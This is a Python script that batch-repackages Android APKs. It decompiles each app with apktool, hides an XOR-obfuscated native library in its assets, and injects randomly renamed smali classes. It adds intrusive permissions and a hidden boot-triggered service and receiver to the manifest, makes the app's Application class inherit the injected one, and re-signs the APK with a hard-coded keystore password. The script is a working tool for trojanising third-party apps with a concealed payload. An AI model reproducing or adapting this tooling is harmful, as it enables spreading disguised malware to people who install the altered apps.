#!/usr/bin/env python
# -*- coding:utf-8 -*-  
# @Time    : 2017/8/16 14:24
# @Author  : CGX


import os
import re
import shutil
import datetime
import random

path = '/Users/cuangengxuan/Desktop/proguard/AutoInsert'
sPath = path + '/sopath/'
decompile='java -jar '+path+'/apktool_2.2.3.jar d -f '
build = 'java -jar '+path+'/apktool_2.2.3.jar b -f '
insertApkPath = path+'/InsertApk'

# 以下定义的字符串如果PluginDemo中的有所更改，上面的也要随之更改！！！！
soAssetName = 'cc'
global insertFileName
global currentPkg
global subid
demo = path+'/PluginDemo1'
soenname = 'jodsavj(ui'                     # PluginDemo中so文件名加密后的字符串
oldMethod = 'startServ'                     # PluginDemo中Native类的本地方法名
oldLibName = 'savj'                         # PluginDemo中solib库的名称加密后的字符串
a = 'c'                                    # PluginDemo中U类混淆后对应的文件
App = 'App'                                 # PluginDemo中Application类
MS = 'XS'                                   # PluginDemo中服务类
RE = 'CR'                                   # PluginDemo中广播类
dir = 'com/ufk/pls/'                        # PluginDemo中Application、服务、广播所在的路径
soFileName = 'Unat'                         # Native类名
soFileP = 'Landroid/util/'+soFileName       # Native类smali中的引用
# 以上定义的字符串如果PluginDemo中的有所更改，上面的也要随之更改！！！！

global newSoFileP                           # 新Native类的引用 La/b/c
global newClassFile                         # 新Native类的名称
global newClassPath                         # 新Native类所在的路径  a/b/c
global newMethod                            # 新Native方法的名称
global newSoName                            # 新so文件的名称 aaa.so
global newLibName                           # 新so lib名称

global ppath    # so库所在的位置

global applicationName
applicationName = dir.replace("/", ".")+App
oaName = "L"+dir+App
osName = "L"+dir+MS
orName = "L"+dir+RE
ooName = "L"+dir+a
global aName
global smailDir                             #com/XX/YY/  格式

fileNameSet = {}

# 统计某个目录中的文件数量，不包括子文件夹
def fileCountInDir(dir):
    list = os.listdir(dir)

    while True:
        if '.DS_Store' in list:
            list.remove('.DS_Store')
        else:
            break

    return len(list)

soFileSize = fileCountInDir("/Users/cuangengxuan/Desktop/proguard/AutoInsert/sopath")  # 提供的so库的数量

# 字符串加密
def entryString(str):
    bytes = str.encode('utf-8')
    bytes = bytearray(bytes)
    length = len(bytes)
    for index in range(0, length):
        bytes[index] = 6 ^ bytes[index]
    return bytes.decode('utf-8')# 字符串

def createWorld():
    return chr(random.randint(65,90))+chr(random.randint(97,122))

# 创建文件名称
def createFileName(key):
    flag = True
    while flag:
        fileName = ''+createWorld()
        if fileName not in fileNameSet.values():
            fileNameSet[key] = fileName
            flag = False

# 初始化文件信息
def initFileName(count):
    createFileName(a)
    createFileName(App)
    createFileName(MS)
    createFileName(RE)

    global smailDir
    smailDir = 'com/'+chr(random.randint(97,122))+chr(random.randint(97,122))+chr(random.randint(97,122))\
               +'/'+chr(random.randint(97,122))+chr(random.randint(97,122))+chr(random.randint(97,122))+'/'
    global aName
    aName = 'L'+smailDir+fileNameSet[App]
    global applicationName
    applicationName = smailDir.replace('/','.')+fileNameSet[App]
    print(fileNameSet)
    print("Application:",applicationName)
    print("MS:", smailDir.replace('/','.')+fileNameSet[MS])
    print("RE:", smailDir.replace('/','.')+fileNameSet[RE])
    print("c:", smailDir.replace('/','.')+fileNameSet[a])

    # 获取so
    index = count % soFileSize  # random.randint(2,2)
    print("so index:", index)
    global ppath
    ppath = sPath + str(index)
    fileso = ''
    for root, dirs, files in os.walk(ppath):
        for fileName in files:
            fileso = fileName
    strs = fileso.split("#")
    global newClassPath
    newClassPath = strs[0].replace("_", "/")
    global newClassFile
    newClassFile = strs[1]
    global newMethod
    newMethod = strs[2]
    global newSoFileP
    newSoFileP = 'L'+newClassPath+"/"+newClassFile

    global newSoName
    newSoName = entryString(strs[3])
    global newLibName
    newLibName = entryString(strs[3][2:].replace(".so", ''))

    print("newClassPath:", newClassPath)
    print("newClassFile:", newClassFile)
    print("newMethod:", newMethod)
    print("newSoFileP:", newSoFileP)
    print("newSoName:", newSoName)
    print("newLibName:", newLibName)


# 删除文件
def deleteFile(sourceDir, deleteFile):
    for root, dirs, files in os.walk(sourceDir):
        for fileName in files:
            srcFilePath = os.path.join(root, fileName)
            if deleteFile in fileName:
                os.remove(srcFilePath)
                print("删除", srcFilePath)


def copySo(target):
    source = ppath
    for file in os.listdir(source):
        sourceFile = os.path.join(source,  file)
        targetFile = os.path.join(target, soAssetName)
        srcRead = open(sourceFile, 'rb')
        desWrite = open(targetFile, 'wb')
        desWrite.write(srcRead.read())
        srcRead.close()
        desWrite.close()


def copyNativeClass():
    source = demo+"/smali/"+soFileP.replace("L", "").replace('/'+soFileName,"")
    target = path + '/' + insertFileName+"/smali/"+newClassPath
    if not os.path.exists(target):
        os.makedirs(target)
    for file in os.listdir(source):
        sourceFile = os.path.join(source,  file)
        targetFile = os.path.join(target, newClassFile+'.smali')
        srcRead = open(sourceFile, 'r')
        desWrite = open(targetFile, 'wb')
        while True:
            line = srcRead.readline()
            if not line:
                break

            if soFileP in line:
                line = line.replace(soFileP, newSoFileP)

            if oldMethod in line:
                line = line.replace(oldMethod, newMethod)

            desWrite.write(line.encode('utf-8'))
        srcRead.close()
        desWrite.close()

# 复制文件
def copyFiles(sourceDir,  targetDir):
    for file in os.listdir(sourceDir):
        sourceFile = os.path.join(sourceDir,  file)

        fileN = file.replace(".smali", '')
        if (fileN in fileNameSet.keys()):
            targetFile = os.path.join(targetDir, fileNameSet[fileN]+'.smali')
            print("targetFile:"+targetFile)
        else:
            targetFile = os.path.join(targetDir,  file)

        if os.path.isfile(sourceFile):
            if not os.path.exists(targetDir):
                os.makedirs(targetDir)
            if not os.path.exists(targetFile) or (os.path.exists(targetFile) and (os.path.getsize(targetFile) != os.path.getsize(sourceFile))):
                if '.smali' in file and fileN in fileNameSet.keys():
                    srcRead = open(sourceFile, 'r')
                    desWrite = open(targetFile, 'wb')
                    while True:
                        line = srcRead.readline()
                        if not line:
                            break
                        if 'subid' in line:
                            global subid
                            # subid = insertFileName[-(len(insertFileName)-insertFileName.rfind('.')-1):]
                            subid = str(currentPkg).replace("_", ".");
                            line = line.replace("subid",subid)
                            print("\033[32;0msubid:"+line)
                            print('\033[0m')
                        if oaName in line:
                            line = line.replace(oaName, aName)

                        if osName in line:
                            line = line.replace(osName, 'L'+smailDir+fileNameSet[MS])

                        if orName in line:
                            line = line.replace(orName, 'L'+smailDir+fileNameSet[RE])

                        if ooName in line:
                            line = line.replace(ooName, 'L'+smailDir+fileNameSet[a])

                        desWrite.write(line.encode('utf-8'))

                    srcRead.close()
                    desWrite.close()
                elif '.smali' in file:
                    srcRead = open(sourceFile, 'r')
                    desWrite = open(targetFile, 'wb')
                    while True:
                        line = srcRead.readline()
                        if not line:
                            break

                        if soFileP in line:
                            line = line.replace(soFileP, newSoFileP)

                        if soenname in line:
                            line = line.replace(soenname, newSoName)
                        if oldLibName in line:
                            line = line.replace(oldLibName, newLibName)
                        if oldMethod in line:
                            line = line.replace(oldMethod, newMethod)

                        desWrite.write(line.encode('utf-8'))
                    srcRead.close()
                    desWrite.close()
                else:
                    open(targetFile, "wb").write(open(sourceFile, "rb").read())
        if os.path.isdir(sourceFile):
            First_Directory = False
            copyFiles(sourceFile, targetFile)

# 重命名文件
def reNameFiles(sourceDir, targetDir):
    for file in os.listdir(sourceDir):
        sourceFile = os.path.join(sourceDir, file)
        file = file.replace('_', '.').replace(' ', '.')
        # fileName = file.replace('.apk', '');
        # sub = 'U' + fileName[-(len(fileName) - fileName.rfind('.') - 1):]
        # file = fileName + '.' + sub + ".apk"
        targetFile = os.path.join(targetDir, file)
        if os.path.isfile(sourceFile):
            if not os.path.exists(targetDir):
                os.makedirs(targetDir)
            if not os.path.exists(targetFile) or (
                os.path.exists(targetFile) and (os.path.getsize(targetFile) != os.path.getsize(sourceFile))):
                    open(targetFile, "wb").write(open(sourceFile, "rb").read())
        if os.path.isdir(sourceFile):
            First_Directory = False
            copyFiles(sourceFile, targetFile)


# 处理Application的类，让其继承Application的类继承com.sub.core.App
def handleApplication(classNamePath, className):
    sourceFile = classNamePath + className + ".smali"
    targetFile = classNamePath + className + ".txt"
    print("\033[32;0mapplication smali:" + sourceFile)
    srcRead = open(sourceFile, 'r')
    count = 0
    isNeed = False
    while True:
        line = srcRead.readline()
        if 1 == count:
            # 如果该类直接继承Application就直接处理，如果不是继承Application需要递归找到继承Application的类
            if 'super' in line:
                if 'android/app/Application' in line:
                    print("\033[32;0msourceFile:"+sourceFile)
                    isNeed = True
                else:
                    result = re.search('L.*;', line)
                    if result:
                        str = result.group().replace(";",'')[1:]
                        print("\033[32;0mnext application:"+str)
                        # 递归找到继承Application的类
                        handleApplication(classNamePath, str)
        if count == 1:
            break

        count = count + 1

    srcRead.close()

    # 处理继承Application的类，让其继承com.sub.core.App
    if isNeed:
        srcRead = open(sourceFile, 'r')
        desWrite = open(targetFile, 'wb')
        while True:
            line = srcRead.readline()
            if not line:
                break
            if 'super' in line:
                replace_reg = re.compile('Landroid/app/Application;')
                line = replace_reg.sub(aName+";", line)
            if 'invoke-direct {p0}, Landroid/app/Application;-><init>()V' in line:
                line = line.replace('Landroid/app/Application', aName)
            desWrite.write(line.encode('utf-8'))

        srcRead.close()
        desWrite.close()
        os.remove(os.path.join(sourceFile))
        os.rename(targetFile, sourceFile)

# 处理清单文件，添加权限和组件，修改Application入口类
def handleManifest():
    # 清单文件添加权限和组件
    permission = ''' 
       <uses-permission android:name="android.permission.INTERNET"/>
       <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
       <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
       <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
       <uses-permission android:name="android.permission.GET_TASKS"/>
       <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
       <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
       <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
       <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
       <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>\n'''

    assembly = '''
        <service android:exported="true" android:name="%s" android:process=":subc" />
        <receiver android:name="%s">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.USER_PRESENT"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
                <data android:scheme="package"/>
            </intent-filter>
        </receiver>\n'''%(dir.replace("/", ".")+MS, dir.replace("/", ".")+RE)
    assembly = assembly.replace(dir.replace("/", ".") + MS, smailDir.replace("/", ".") + fileNameSet[MS])
    assembly = assembly.replace(dir.replace("/", ".") + RE, smailDir.replace("/", ".") + fileNameSet[RE])

    sourceFile = path + '/' + insertFileName + '/AndroidManifest.xml'
    targetFile = path + '/' + insertFileName + '/AndroidManifest.txt'
    srcRead = open(sourceFile, 'r')
    desWrite = open(targetFile, 'wb')
    writePer = True
    writeA = True
    isCanWriteP = False    # 是否可以写入组件，等写完<application 结点之后才能写入组件
    while True:
        line = srcRead.readline()
        if not line:
            break
        if writePer:
            if '<uses-permission' in line:
                writePer = False
                desWrite.write(permission.encode('utf-8'))
        if writeA and isCanWriteP:
            # if '<activity' in line or '<service' in line:
                writeA = False
                desWrite.write(assembly.encode('utf-8'))


        if ('<manifest' in line and ' package="' in line):
            result = re.search('package="[^"]*"', line)  # 匹配package="com.a.app"  PkgName
            if result:
                global currentPkg
                currentPkg = (result.group().replace('"','').split('='))[1]

        if '<application' in line:
            isCanWriteP = True
            if 'android:name=' in line:  # 如果有入口获取其入口类的全路径
                # 匹配中间没有符号"的字符串   防止无匹配package="com.ygd.kjh.uhy" platformBuildVersionCode="22"
                result = re.search('android:name="[^"]*"', line)  # 匹配android:name="com.a.app"
                if result:
                    # android:name=".*?"
                    # str = result.group().replace('"', '').split(' ')[0].split('=')
                    str = result.group().replace('"','').split('=')
                    className = str[1]

                    # 该入口类的smali代码所在的路径
                    classNamePath = path + '/' + insertFileName + "/smali/"
                    print("\033[32;0m有入口类Application Name:"+className)

                    # 处理入口类让其继承com.sub.core.App
                    handleApplication(classNamePath, className.replace(".", "/"))

            else: # 如果没有入口类直接添加ndroid:name="com.sub.core.App作为入口类
                str = line[0:(line.find('>'))]
                line = str+' android:name="'+applicationName+'">'
                print("\033[32;0m没有入口类"+line)

        desWrite.write(line.encode('utf-8'))

    srcRead.close()
    desWrite.close()
    os.remove(os.path.join(sourceFile))
    os.rename(targetFile, sourceFile)


def func():
    print("so数量：", soFileSize)
    count = -1;
    successed = 0;
    failed = 0;
    failedList = []
    sTime = datetime.datetime.now()
    # 保存文件名  包名  subid
    pckInfoWrite = open("/Users/cuangengxuan/Desktop/PackageInfo.txt", 'wb')
    for root, dirs, files in os.walk(insertApkPath):
        for fileName in files:
            srcFilePath = os.path.join(root, fileName)
            if '.apk' in srcFilePath and '.DS.Store' not in srcFilePath:
                count = count + 1
                print('\033[31;0m***********************************************************************')
                print('\033[31;0m正在处理第%d个包:%s' % (count, fileName))
                print('\033[0m')
                starttime = datetime.datetime.now()

                try:
                    initFileName(count)
                    # 反编译命令
                    cmd = decompile + srcFilePath
                    os.system('cd ' + path + ' && ' + cmd)  # ' && '连续执行两条指令

                    # 获取正在处理的文件名
                    global insertFileName
                    insertFileName = fileName.replace('.apk', '')
                    insertFilePath = path + "/" + insertFileName

                    # 复制assert
                    copyFiles(demo + '/assets', insertFilePath + '/assets')
                    copySo(insertFilePath + '/assets')
                    # 复制smali代码
                    copyNativeClass()

                    # 处理清单文件，copy权限和组件，
                    # 如果没有Application入口，直接在清单文件中添加android:name="com.sub.core.App"
                    # 如果入口获取入口的全路径，修改其入口文件的smali代码让其继承咱的com.sub.core.App
                    handleManifest()
                    copyFiles(demo + '/smali/' + dir[0:-1], insertFilePath + '/smali/' + smailDir[0:-1])
                    print('\033[0m')

                    # 删除DS_Store文件
                    deleteFile(insertFilePath, ".DS_Store")

                    # # 回编译
                    b = build + insertFilePath
                    os.system(b)

                    # 重新签名
                    apkPath = insertFilePath+"/dist/"+fileName
                    keyName = 'uc3'
                    jarsigner = 'jarsigner -verbose -keystore /Users/cuangengxuan/Desktop/apk/'+keyName+'.keystore -storepass emob123 -keypass emob123 -sigfile CERT -digestalg SHA1 -sigalg MD5withRSA -signedjar '+path+'/Success/'+fileName+' '+apkPath+' '+keyName
                    os.system('cd '+path +' && ' + jarsigner)

                    if os.path.exists(insertFilePath):
                        shutil.rmtree(insertFilePath)
                    successed = successed + 1
                    pckInfoWrite.write((insertFileName + "\t" + currentPkg + "\t" + subid).encode('utf-8'))
                except Exception as e:
                    failed = failed + 1
                    print('\033[35;0m', Exception, ":", e)
                    print('\033[35;0m'+insertFileName+"该文件处理失败！")
                    failedList.append(insertFileName)
                endtime = datetime.datetime.now()
                print('\033[31;0m该包处理时间：', (endtime - starttime))
                print('\033[0m')

    pckInfoWrite.close()
    print('\033[31;0m插包完成！本次成功处理了%d个包, 失败了%d个'%(successed, failed))
    if failed > 0:
        print("\033[31;0m失败的文件：",failedList)
    print('\033[31;0m总用时：', (datetime.datetime.now() - sTime))


if __name__ == '__main__':
    func();
    # reNameFiles(insertApkPath+'_original', insertApkPath)
    # initFileName()
